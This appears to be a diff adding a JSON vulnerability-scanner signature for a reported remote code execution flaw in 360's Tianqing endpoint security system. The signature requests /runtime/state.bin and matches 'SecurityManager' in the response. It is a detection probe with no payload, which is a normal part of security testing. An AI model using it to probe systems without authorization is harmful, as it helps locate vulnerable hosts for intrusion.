@@ -1,0 +1,14 @@
+{
+	"name":"天擎终端安全管理系统YII_CSRF_TOKEN远程代码执行",
+	"tag":"360",
+	"type":"other",
+	"poc":{
+		"pocGet":"/runtime/state.bin",
+		"header":{
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15",
+			"Accept-Encoding":" gzip"
+		},
+		"status_code":"200",
+		"pattern":"(SecurityManager)"
+	}
+}
